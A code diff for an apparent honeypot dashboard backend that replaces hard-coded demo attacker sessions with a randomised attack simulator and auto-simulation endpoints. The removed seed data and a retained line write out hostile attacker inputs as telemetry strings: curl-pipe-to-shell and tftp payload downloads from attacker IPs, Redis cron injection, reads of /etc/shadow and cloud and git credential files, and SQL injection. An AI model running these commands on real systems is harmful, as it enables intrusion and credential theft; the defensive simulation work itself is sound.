@@ -348,285 +348,51 @@ async def clear_all_captured_data(db: Session = Depends(database.get_db)):
         db.rollback()
         raise HTTPException(status_code=500, detail=f"Failed to clear database: {str(e)}")
 
-@app.post("/api/data/seed")
-async def seed_example_data(db: Session = Depends(database.get_db)):
-    """
-    Populates realistic attacker sessions, credentials, geolocations, and MITRE commands for demonstration.
-    """
-    try:
-        import uuid
-        sample_sessions = [
-            {
-                "id": "sess-live-ssh-01",
-                "ip_address": "185.220.101.5",
-                "protocol": "SSH",
-                "country": "Germany",
-                "city": "Frankfurt",
-                "latitude": 50.1109,
-                "longitude": 8.6821,
-                "username_attempted": "root",
-                "password_attempted": "admin1234",
-                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=4),
-                "ended_at": None,
-                "events": [
-                    ("login_attempt", "root / admin1234", "Accepted password for root from 185.220.101.5 port 52344 ssh2", "SSH"),
-                    ("command_execution", "uname -a", "Linux prod-web-srv-01 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64 GNU/Linux", "SSH"),
-                    ("command_execution", "whoami", "root", "SSH"),
-                    ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "SSH"),
-                    ("command_execution", "cat /etc/shadow", "root:$6$Z8sK1xQ...:18900:0:99999:7:::\ndaemon:*:18885:0:99999:7:::", "SSH"),
-                    ("command_execution", "curl -s http://185.220.101.5/stage2.sh | bash", "Resolving host... Downloading payload (14.2 KB)... Staged in /tmp/.sys_update", "SSH"),
-                    ("command_execution", "crontab -l", "no crontab for root", "SSH"),
-                ]
-            },
-            {
-                "id": "sess-live-http-02",
-                "ip_address": "194.26.29.114",
-                "protocol": "HTTP",
-                "country": "Netherlands",
-                "city": "Amsterdam",
-                "latitude": 52.3676,
-                "longitude": 4.9041,
-                "username_attempted": "admin",
-                "password_attempted": "' OR '1'='1",
-                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=9),
-                "ended_at": None,
-                "events": [
-                    ("login_attempt", "admin'--", "HTTP 200 OK - Redirecting to /admin/dashboard", "HTTP"),
-                    ("command_execution", "SELECT * FROM users WHERE username='admin' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--", "Trap Activated: Honeytoken DB schema accessed", "HTTP"),
-                    ("command_execution", "GET /api/v1/debug?cmd=cat%20/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", "HTTP"),
-                ]
-            },
-            {
-                "id": "sess-live-mysql-03",
-                "ip_address": "45.155.205.233",
-                "protocol": "MySQL",
-                "country": "Russia",
-                "city": "Moscow",
-                "latitude": 55.7558,
-                "longitude": 37.6173,
-                "username_attempted": "root",
-                "password_attempted": "toor",
-                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=15),
-                "ended_at": None,
-                "events": [
-                    ("login_attempt", "root / toor", "Handshake 5.7.34-MySQL-Standard accepted", "MySQL"),
-                    ("command_execution", "SHOW DATABASES;", "information_schema\ncustomer_vault\npayments_db", "MySQL"),
-                    ("command_execution", "SELECT * FROM payments_db.credit_cards LIMIT 10;", "Trap Activated: Canary Honeytoken Triggered [DB_EXFIL_ATTEMPT]", "MySQL"),
-                ]
-            },
-            {
-                "id": "sess-live-redis-04",
-                "ip_address": "91.240.118.242",
-                "protocol": "Redis",
-                "country": "Bulgaria",
-                "city": "Sofia",
-                "latitude": 42.6977,
-                "longitude": 23.3219,
-                "username_attempted": "default",
-                "password_attempted": "none",
-                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=24),
-                "ended_at": None,
-                "events": [
-                    ("login_attempt", "unauthenticated", "Redis 6.0.9 ready", "Redis"),
-                    ("command_execution", "CONFIG SET dir /var/spool/cron/crontabs", "OK", "Redis"),
-                    ("command_execution", "CONFIG SET dbfilename root", "OK", "Redis"),
-                    ("command_execution", "SET backup '* * * * * curl http://91.240.118.242/cron.sh | sh'", "Trap Activated: Unauthorized Cron Injection", "Redis"),
-                    ("command_execution", "SAVE", "DB saved on disk", "Redis"),
-                ]
-            },
-            {
-                "id": "sess-closed-telnet-05",
-                "ip_address": "103.149.138.82",
-                "protocol": "Telnet",
-                "country": "Singapore",
-                "city": "Singapore",
-                "latitude": 1.3521,
-                "longitude": 103.8198,
-                "username_attempted": "support",
-                "password_attempted": "support123",
-                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=45),
-                "ended_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=30),
-                "events": [
-                    ("login_attempt", "support / support123", "Telnet terminal session initialized", "Telnet"),
-                    ("command_execution", "enable", "Password:", "Telnet"),
-                    ("command_execution", "sh running-config", "Building configuration... Current configuration : 1084 bytes", "Telnet"),
-                ]
-            },
-            {
-                "id": "sess-live-ssh-usa-06",
-                "ip_address": "198.51.100.42",
-                "protocol": "SSH",
-                "country": "USA",
-                "city": "Washington",
-                "latitude": 38.9072,
-                "longitude": -77.0369,
-                "username_attempted": "ubuntu",
-                "password_attempted": "password123",
-                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=18),
-                "ended_at": None,
-                "events": [
-                    ("login_attempt", "ubuntu / password123", "Accepted password for ubuntu from 198.51.100.42 port 54112 ssh2", "SSH"),
-                    ("command_execution", "id", "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo)", "SSH"),
-                    ("command_execution", "sudo -l", "(ALL : ALL) NOPASSWD: ALL", "SSH"),
-                    ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE", "SSH"),
-                    ("command_execution", "docker ps", "CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS\n4a12f9b8c01e   prod-db:latest   docker-entrypoint.sh     2 days ago      Up 2 days", "SSH"),
-                ]
-            },
-            {
-                "id": "sess-live-http-canada-07",
-                "ip_address": "192.0.2.78",
-                "protocol": "HTTP",
-                "country": "Canada",
-                "city": "Ottawa",
-                "latitude": 45.4215,
-                "longitude": -75.6972,
-                "username_attempted": "manager",
-                "password_attempted": "admin@2024",
-                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=12),
-                "ended_at": None,
-                "events": [
-                    ("login_attempt", "manager / admin@2024", "HTTP 200 OK - Redirecting to /internal/dashboard", "HTTP"),
-                    ("command_execution", "GET /api/v1/users?role=admin", "HTTP 200 OK - Extracted 12 honeytoken records", "HTTP"),
-                    ("command_execution", "POST /api/v1/upload payload.php.jpg", "File quarantined by Sandbox engine", "HTTP"),
-                ]
-            },
-            {
-                "id": "sess-live-ssh-dubai-08",
-                "ip_address": "94.200.15.112",
-                "protocol": "SSH",
-                "country": "Dubai",
-                "city": "Dubai",
-                "latitude": 25.2048,
-                "longitude": 55.2708,
-                "username_attempted": "operator",
-                "password_attempted": "dubai#vip99",
-                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=8),
-                "ended_at": None,
-                "events": [
-                    ("login_attempt", "operator / dubai#vip99", "Accepted password for operator from 94.200.15.112 port 48991 ssh2", "SSH"),
-                    ("command_execution", "hostname", "gateway-dmz-01", "SSH"),
-                    ("command_execution", "netstat -tulpn", "Active Internet connections (only servers)\ntcp  0  0  0.0.0.0:22  0.0.0.0:*  LISTEN", "SSH"),
-                    ("canary_tripwire_triggered", "cat /root/.git-credentials", "Tripwire Beacon Dispatched: canary_tripwire_github_token\nhttps://sentineltrap-deploy-bot:ghp_9kL2x0Vb8M1qR3oP4zW6Y7tJ5nE0A8cCdEfG@github.com", "SSH"),
-                ]
-            },
-            {
-                "id": "sess-live-mysql-china-09",
-                "ip_address": "114.114.114.88",
-                "protocol": "MySQL",
-                "country": "China",
-                "city": "Beijing",
-                "latitude": 39.9042,
-                "longitude": 116.4074,
-                "username_attempted": "root",
-                "password_attempted": "123456",
-                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=5),
-                "ended_at": None,
-                "events": [
-                    ("login_attempt", "root / 123456", "Handshake 5.7.34-MySQL accepted from 114.114.114.88:3306", "MySQL"),
-                    ("command_execution", "SELECT user, host FROM mysql.user;", "Trap Activated: User account table exfiltration attempt", "MySQL"),
-                    ("command_execution", "SELECT * FROM payments_db.credit_cards LIMIT 10;", "Trap Activated: Canary Honeytoken Triggered [DB_EXFIL_ATTEMPT: canary_customer_vault]", "MySQL"),
-                ]
-            }
-        ]
+GLOBAL_HACKER_POOLS = [
+    {"country": "USA", "city": "Washington", "lat": 38.9072, "lon": -77.0369, "ip_prefix": "198.51.100"},
+    {"country": "USA", "city": "New York", "lat": 40.7128, "lon": -74.0060, "ip_prefix": "198.18.0"},
+    {"country": "USA", "city": "San Francisco", "lat": 37.7749, "lon": -122.4194, "ip_prefix": "192.88.99"},
+    {"country": "Canada", "city": "Ottawa", "lat": 45.4215, "lon": -75.6972, "ip_prefix": "192.0.2"},
+    {"country": "Canada", "city": "Toronto", "lat": 43.6532, "lon": -79.3832, "ip_prefix": "142.250.190"},
+    {"country": "Dubai", "city": "Dubai", "lat": 25.2048, "lon": 55.2708, "ip_prefix": "94.200.15"},
+    {"country": "China", "city": "Beijing", "lat": 39.9042, "lon": 116.4074, "ip_prefix": "114.114.114"},
+    {"country": "China", "city": "Shanghai", "lat": 31.2304, "lon": 121.4737, "ip_prefix": "202.96.209"},
+    {"country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "ip_prefix": "185.220.101"},
+    {"country": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041, "ip_prefix": "194.26.29"},
+    {"country": "Russia", "city": "Moscow", "lat": 55.7558, "lon": 37.6173, "ip_prefix": "45.155.205"},
+    {"country": "Singapore", "city": "Singapore", "lat": 1.3521, "lon": 103.8198, "ip_prefix": "103.149.138"},
+    {"country": "Bulgaria", "city": "Sofia", "lat": 42.6977, "lon": 23.3219, "ip_prefix": "91.240.118"},
+    {"country": "Brazil", "city": "Sao Paulo", "lat": -23.5505, "lon": -46.6333, "ip_prefix": "177.12.144"},
+    {"country": "Japan", "city": "Tokyo", "lat": 35.6762, "lon": 139.6503, "ip_prefix": "133.242.18"},
+    {"country": "United Kingdom", "city": "London", "lat": 51.5074, "lon": -0.1278, "ip_prefix": "185.143.221"},
+]
 
-        added_sessions = 0
-        for s in sample_sessions:
-            existing = db.query(models.SessionModel).filter(models.SessionModel.ip_address == s["ip_address"]).first()
-            if not existing:
-                sess_obj = models.SessionModel(
-                    id=s["id"],
-                    ip_address=s["ip_address"],
-                    protocol=s["protocol"],
-                    country=s["country"],
-                    city=s["city"],
-                    latitude=s["latitude"],
-                    longitude=s["longitude"],
-                    username_attempted=s["username_attempted"],
-                    password_attempted=s["password_attempted"],
-                    started_at=s["started_at"],
-                    ended_at=s["ended_at"]
-                )
-                db.add(sess_obj)
-                db.commit()
-                added_sessions += 1
+USERNAMES_POOL = [
+    "root", "admin", "ubuntu", "operator", "support", "deploy", "guest", "oracle",
+    "postgres", "service", "system", "git", "test", "master", "devops", "backup"
+]
 
-                for idx, ev in enumerate(s["events"]):
-                    ev_obj = models.EventModel(
-                        session_id=s["id"],
-                        timestamp=s["started_at"] + datetime.timedelta(seconds=(idx + 1) * 20),
-                        protocol=ev[3],
-                        event_type=ev[0],
-                        input_data=ev[1],
-                        output_data=ev[2]
-                    )
-                    db.add(ev_obj)
-                db.commit()
+PASSWORDS_POOL = [
+    "admin1234", "password123", "toor", "123456", "root@2024", "P@ssw0rd2024",
+    "admin#vip99", "qwerty", "letmein", "toor2024", "' OR '1'='1", "supersecret"
+]
 
-        # Broadcast real-time seed event to all connected WebSockets immediately
-        await manager.broadcast(json.dumps({"event": "data_seeded", "total_seeded": added_sessions, "timestamp": datetime.datetime.utcnow().isoformat()}))
+auto_sim_task: asyncio.Task | None = None
+auto_sim_active: bool = False
+auto_sim_interval_seconds: float = 4.0
 
-        return {
-            "status": "success",
-            "message": f"Seeded {added_sessions} demo attacker sessions with forensic telemetry events.",
-            "total_seeded": added_sessions
-        }
-    except Exception as e:
-        db.rollback()
-        raise HTTPException(status_code=500, detail=f"Failed to seed demo data: {str(e)}")
-
-@app.post("/api/data/simulate-attack")
-async def simulate_live_ingress_attack(persona: str = None, db: Session = Depends(database.get_db)):
-    """
-    Simulates a live adversarial ingress attack tailored to the active Server Persona.
-    - web_app: HTTP & SSH web vulnerabilities (SQLi, path traversal, Canary DB secrets, AWS keys)
-    - database_cluster: MySQL & Redis database probes (DB exfil, cron injection, unauthorized dumps)
-    - mail_gateway: SMTP & DNS reconnaissance (relay probes, domain zone transfers, SSH brute force)
-    - iot_router: Telnet & HTTP BusyBox IoT botnet attacks (Mirai default passwords, router config dumps)
-    - all_mesh: Full-spectrum multi-stage breach across cloud, containers, and Canary tokens
-    """
+async def execute_simulated_attack(persona: str = None, db: Session = None):
     import uuid
     import random
 
     active_persona = persona or decoys.current_persona_id or "all_mesh"
 
-    # Dynamic Random Hacker Profile Generator
-    GLOBAL_HACKER_POOLS = [
-        {"country": "USA", "city": "Washington", "lat": 38.9072, "lon": -77.0369, "ip_prefix": "198.51.100"},
-        {"country": "USA", "city": "New York", "lat": 40.7128, "lon": -74.0060, "ip_prefix": "198.18.0"},
-        {"country": "USA", "city": "San Francisco", "lat": 37.7749, "lon": -122.4194, "ip_prefix": "192.88.99"},
-        {"country": "Canada", "city": "Ottawa", "lat": 45.4215, "lon": -75.6972, "ip_prefix": "192.0.2"},
-        {"country": "Canada", "city": "Toronto", "lat": 43.6532, "lon": -79.3832, "ip_prefix": "142.250.190"},
-        {"country": "Dubai", "city": "Dubai", "lat": 25.2048, "lon": 55.2708, "ip_prefix": "94.200.15"},
-        {"country": "China", "city": "Beijing", "lat": 39.9042, "lon": 116.4074, "ip_prefix": "114.114.114"},
-        {"country": "China", "city": "Shanghai", "lat": 31.2304, "lon": 121.4737, "ip_prefix": "202.96.209"},
-        {"country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "ip_prefix": "185.220.101"},
-        {"country": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041, "ip_prefix": "194.26.29"},
-        {"country": "Russia", "city": "Moscow", "lat": 55.7558, "lon": 37.6173, "ip_prefix": "45.155.205"},
-        {"country": "Singapore", "city": "Singapore", "lat": 1.3521, "lon": 103.8198, "ip_prefix": "103.149.138"},
-        {"country": "Bulgaria", "city": "Sofia", "lat": 42.6977, "lon": 23.3219, "ip_prefix": "91.240.118"},
-        {"country": "Brazil", "city": "Sao Paulo", "lat": -23.5505, "lon": -46.6333, "ip_prefix": "177.12.144"},
-        {"country": "Japan", "city": "Tokyo", "lat": 35.6762, "lon": 139.6503, "ip_prefix": "133.242.18"},
-        {"country": "United Kingdom", "city": "London", "lat": 51.5074, "lon": -0.1278, "ip_prefix": "185.143.221"},
-    ]
-
-    USERNAMES_POOL = [
-        "root", "admin", "ubuntu", "operator", "support", "deploy", "guest", "oracle",
-        "postgres", "service", "system", "git", "test", "master", "devops", "backup"
-    ]
-
-    PASSWORDS_POOL = [
-        "admin1234", "password123", "toor", "123456", "root@2024", "P@ssw0rd2024",
-        "admin#vip99", "qwerty", "letmein", "toor2024", "' OR '1'='1", "supersecret"
-    ]
-
-    # Pick a random origin from global hacker hubs
     origin = random.choice(GLOBAL_HACKER_POOLS)
     rand_octet = random.randint(2, 254)
     attacker_ip = f"{origin['ip_prefix']}.{rand_octet}"
     attacker_user = random.choice(USERNAMES_POOL)
     attacker_pass = random.choice(PASSWORDS_POOL)
 
-    # Determine protocol & attack stages based on active persona (or random if all_mesh)
     if active_persona == "web_app":
         protocol_used = "HTTP"
         decoy_name = "Web Application Trap"
@@ -671,7 +437,6 @@ async def simulate_live_ingress_attack(persona: str = None, db: Session = Depend
             ("deception_triggered", f"tftp -g -r mips_bot http://{attacker_ip}/bot.bin", "Trap activated: malware_stager_download_blocked", "Telnet"),
         ]
     else:
-        # all_mesh: Random protocol from mesh (SSH, HTTP, MySQL, Redis, Telnet)
         protocol_used = random.choice(["SSH", "SSH", "HTTP", "MySQL", "Redis", "Telnet"])
         decoy_name = f"{protocol_used} Honeypot"
         attack_stages = [
@@ -687,7 +452,6 @@ async def simulate_live_ingress_attack(persona: str = None, db: Session = Depend
 
     session_id = f"sim-{uuid.uuid4().hex[:8]}"
 
-    # 1. Create attacker session in DB
     session = models.SessionModel(
         id=session_id,
         ip_address=attacker_ip,
@@ -704,7 +468,6 @@ async def simulate_live_ingress_attack(persona: str = None, db: Session = Depend
     db.add(session)
     db.commit()
 
-    # Broadcast session open to WebSockets
     await manager.broadcast(json.dumps({
         "event_type": "session_created",
         "session": {
@@ -718,7 +481,6 @@ async def simulate_live_ingress_attack(persona: str = None, db: Session = Depend
         }
     }))
 
-    # 2. Sequence of realistic ingress attack stages
     for stage_data in attack_stages:
         ev_type = stage_data[0]
         inp = stage_data[1]
@@ -739,7 +501,6 @@ async def simulate_live_ingress_attack(persona: str = None, db: Session = Depend
         db.add(event)
         db.commit()
 
-        # Broadcast event in real-time
         await manager.broadcast(json.dumps({
             "event_type": "new_event",
             "session_id": session_id,
@@ -753,9 +514,8 @@ async def simulate_live_ingress_attack(persona: str = None, db: Session = Depend
                 "timestamp": event.timestamp.isoformat()
             }
         }))
-        await asyncio.sleep(0.3)
+        await asyncio.sleep(0.15)
 
-    # 3. Activate target Decoy Model state in database
     decoy_record = db.query(models.DecoyModel).filter(models.DecoyModel.name == decoy_name).first()
     if decoy_record:
         decoy_record.status = "active"
@@ -763,7 +523,6 @@ async def simulate_live_ingress_attack(persona: str = None, db: Session = Depend
         decoy_record.activated_at = datetime.datetime.utcnow()
         db.commit()
 
-    # 4. Closed-loop AutoShun calculation
     all_sess_events = db.query(models.EventModel).filter(models.EventModel.session_id == session_id).all()
     risk_score, classification, indicators = ThreatAnalyticsEngine.calculate_risk_score(all_sess_events)
 
@@ -771,18 +530,80 @@ async def simulate_live_ingress_attack(persona: str = None, db: Session = Depend
         "status": "success",
         "persona_used": active_persona,
         "protocol": protocol_used,
-        "message": f"Simulated live ingress attack matching persona '{active_persona}' from {target['ip']} ({target['city']}, {target['country']}). Canary Honeytokens tripped and live telemetry broadcast to SOC.",
+        "message": f"Simulated live ingress attack from {attacker_ip} ({origin['city']}, {origin['country']}). Canary Honeytokens tripped and live telemetry broadcast to SOC.",
         "session_id": session_id,
-        "ip_address": target["ip"],
+        "ip_address": attacker_ip,
         "threat_risk_score": risk_score,
         "threat_classification": classification,
         "mitre_ttps_tripped": ["T1552.001", "T1059", "T1083", "T1003"],
         "autoshun_mitigation": {
             "action": "AUTO_SHUN_DROP",
-            "firewall_rule": f"iptables -A INPUT -s {target['ip']} -j DROP",
+            "firewall_rule": f"iptables -A INPUT -s {attacker_ip} -j DROP",
             "status": "ENGAGED" if risk_score >= 75 else "MONITORED"
         }
     }
+
+async def auto_attack_traffic_loop():
+    global auto_sim_active
+    while auto_sim_active:
+        try:
+            with database.SessionLocal() as db:
+                await execute_simulated_attack(db=db)
+        except Exception:
+            pass
+        await asyncio.sleep(auto_sim_interval_seconds)
+
+@app.post("/api/simulation/auto/start")
+async def start_auto_simulation(interval: float = 4.0):
+    global auto_sim_task, auto_sim_active, auto_sim_interval_seconds
+    auto_sim_interval_seconds = max(1.5, min(interval, 30.0))
+    if not auto_sim_active:
+        auto_sim_active = True
+        auto_sim_task = asyncio.create_task(auto_attack_traffic_loop())
+    await manager.broadcast(json.dumps({"event": "auto_simulation_status", "active": True, "interval": auto_sim_interval_seconds}))
+    return {"status": "success", "message": "Automated attack simulation active", "active": True, "interval": auto_sim_interval_seconds}
+
+@app.post("/api/simulation/auto/stop")
+async def stop_auto_simulation():
+    global auto_sim_task, auto_sim_active
+    auto_sim_active = False
+    if auto_sim_task:
+        auto_sim_task.cancel()
+        auto_sim_task = None
+    await manager.broadcast(json.dumps({"event": "auto_simulation_status", "active": False}))
+    return {"status": "success", "message": "Automated attack simulation stopped", "active": False}
+
+@app.get("/api/simulation/auto/status")
+def get_auto_simulation_status():
+    return {"active": auto_sim_active, "interval": auto_sim_interval_seconds}
+
+@app.post("/api/data/seed")
+async def seed_example_data(count: int = 5, db: Session = Depends(database.get_db)):
+    try:
+        results = []
+        for _ in range(max(1, min(count, 10))):
+            res = await execute_simulated_attack(db=db)
+            results.append(res)
+        
+        await manager.broadcast(json.dumps({
+            "event": "data_seeded",
+            "total_seeded": len(results),
+            "timestamp": datetime.datetime.utcnow().isoformat()
+        }))
+
+        return {
+            "status": "success",
+            "message": f"Generated {len(results)} dynamic simulated attacks across global hubs.",
+            "total_seeded": len(results),
+            "sessions": results
+        }
+    except Exception as e:
+        db.rollback()
+        raise HTTPException(status_code=500, detail=f"Failed to generate live demo attacks: {str(e)}")
+
+@app.post("/api/data/simulate-attack")
+async def simulate_live_ingress_attack(persona: str = None, db: Session = Depends(database.get_db)):
+    return await execute_simulated_attack(persona=persona, db=db)
 
 @app.get("/api/reports/export")
 def export_logs(format: str = "json", db: Session = Depends(database.get_db)):
